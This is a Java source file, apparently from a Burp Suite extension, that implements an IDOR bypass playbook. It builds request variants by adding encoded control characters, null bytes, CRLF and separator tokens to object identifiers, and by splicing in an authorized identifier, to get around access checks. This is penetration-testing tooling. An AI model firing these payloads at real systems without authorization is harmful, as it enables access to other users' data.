package com.bypassfuzzer.burp.core.idor.playbooks;

import burp.api.montoya.http.message.requests.HttpRequest;
import com.bypassfuzzer.burp.core.idor.IdorRequestContext;
import com.bypassfuzzer.burp.http.LocatedParameter;
import com.bypassfuzzer.burp.http.ParameterLocation;
import com.bypassfuzzer.burp.http.RequestParameterSupport;

import java.util.ArrayList;
import java.util.List;

/**
 * PLAYBOOK: idor.hybrid.trailing_control_characters
 * Append encoded trailing control characters to discovered identifier locations to probe regex and normalization gaps.
 */
public class TrailingControlCharactersPlaybook implements IdorPlaybook {

    private static final List<String> TRAILING_CONTROL_SUFFIXES = List.of(
        "%20",
        "%09",
        "%0a",
        "%0d",
        "%0b",
        "%0c",
        "%1c",
        "%1d",
        "%1e",
        "%1f",
        "%00"
    );

    private static final List<String> TRIMMING_WHITESPACE_TOKENS = List.of(
        "%20",
        "%09",
        "%0a",
        "%0d"
    );

    private static final List<String> INFIX_SEPARATOR_TOKENS = List.of(
        "%0d%0a",
        "%0a",
        "%0d",
        "%00",
        ";",
        ",",
        "|",
        "&",
        "#",
        "%0a%0dcc:"
    );

    @Override
    public String id() {
        return "idor.hybrid.trailing_control_characters";
    }

    @Override
    public String displayName() {
        return "Trailing Control Characters";
    }

    @Override
    public String description() {
        return "Try trailing control and null bytes, plus leading/surrounding encoded whitespace, against discovered identifier locations.";
    }

    @Override
    public List<IdorRequestVariant> buildVariants(IdorRequestContext context) {
        String targetIdentifier = context.targetIdentifier();
        if (targetIdentifier.isEmpty()) {
            return List.of();
        }

        HttpRequest targetRequest = context.targetRequest();
        List<IdorRequestVariant> variants = new ArrayList<>();
        IdorPlaybookSupport.addPathIdentifierValueVariants(
            context,
            variants,
            targetRequest,
            allPathCandidates(targetIdentifier, context.authorizedIdentifier()),
            candidate -> "path " + candidate
        );

        for (LocatedParameter parameter : context.identifierParameters()) {
            if (parameter.location() != ParameterLocation.QUERY && !parameter.isBody()) {
                continue;
            }
            for (String candidate : allValueCandidates(targetIdentifier, context.authorizedIdentifier())) {
                HttpRequest updated = RequestParameterSupport.replaceParameterValue(targetRequest, parameter, candidate);
                String before = parameter.isBody() ? targetRequest.bodyToString() : targetRequest.path();
                String after = parameter.isBody() ? updated.bodyToString() : updated.path();
                if (before.equals(after)) {
                    continue;
                }
                variants.add(new IdorRequestVariant(
                    parameter.location().name().toLowerCase() + " " + parameter.path() + " -> " + candidate,
                    updated
                ));
            }
        }
        return variants;
    }

    private static List<String> allPathCandidates(String targetIdentifier, String authorizedIdentifier) {
        return allValueCandidates(targetIdentifier, authorizedIdentifier);
    }

    private static List<String> allValueCandidates(String value, String authorizedIdentifier) {
        List<String> candidates = new ArrayList<>();
        for (String suffix : TRAILING_CONTROL_SUFFIXES) {
            candidates.add(value + suffix);
        }
        for (String token : TRIMMING_WHITESPACE_TOKENS) {
            candidates.add(token + value);
            candidates.add(token + value + token);
        }
        if (authorizedIdentifier != null && !authorizedIdentifier.isBlank()) {
            for (String token : INFIX_SEPARATOR_TOKENS) {
                // Both directions: auth might parse first/last differently
                candidates.add(value + token + authorizedIdentifier);
                candidates.add(authorizedIdentifier + token + value);
            }
        }
        return candidates;
    }
}
